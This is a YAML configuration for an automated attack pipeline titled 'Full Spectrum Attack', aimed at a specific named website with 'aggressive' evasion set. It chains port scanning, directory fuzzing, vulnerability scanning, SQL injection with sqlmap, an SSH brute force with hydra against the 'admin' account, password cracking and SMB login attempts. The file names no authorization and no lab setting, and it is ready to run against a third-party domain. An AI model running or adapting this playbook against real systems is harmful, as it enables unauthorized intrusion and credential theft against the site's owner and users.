name: "Full Spectrum Attack"
target: "https://www.takwene.com"
evasion: "aggressive"   # low, medium, high, aggressive

phases:
  - name: "recon"
    tools:
      - tool: masscan
        args: ["-p80,443,22", "--rate=1000", "--wait=0"]
      - tool: rustscan
        args: ["--ulimit", "5000", "--top"]
      - tool: nmap
        # Full -p- often reports all-filtered from Docker; probe common web/SSH ports.
        args: ["-sV", "-p21,22,80,443,8080,8443", "-T4"]
      - tool: whatweb
        args: ["-a", "3"]
      - tool: gobuster
        args: ["dir", "-u", "{{target}}", "-w", "/usr/share/dirb/wordlists/common.txt", "-b", "404,301"]
      - tool: theharvester
        args: ["-d", "{{target}}", "-l", "100", "-b", "crtsh"]
      - tool: ffuf
        args: ["-u", "{{target}}/FUZZ", "-w", "/usr/share/dirb/wordlists/common.txt", "-ac"]
    parallel: true

  - name: "vulnerability_scan"
    tools:
      - tool: nuclei
        args: ["-t", "http/cves/", "-severity", "critical,high", "-silent"]
      - tool: nikto
        args: ["-maxtime", "60"]
      - tool: xsstrike
        args: ["--timeout", "20", "--skip", "--threads", "5"]
    parallel: false
    depends_on: ["recon"]

  - name: "exploitation"
    tools:
      - tool: sqlmap
        args: ["--batch", "--level=2", "--risk=1"]
    depends_on: ["vulnerability_scan"]
    when: "vuln_found == True"

  - name: "credential"
    tools:
      - tool: hydra
        args: ["-l", "admin", "-P", "/usr/share/nmap/nselib/data/passwords.lst", "-t", "4", "ssh://{{target}}"]
      - tool: john
        args: ["--wordlist=/usr/share/john/password.lst", "--format=nt"]
      - tool: crackmapexec
        args: ["smb", "{{target}}", "-u", "admin", "-p", "password"]
    parallel: false
    depends_on: ["recon"]
    when: "vuln_found == True"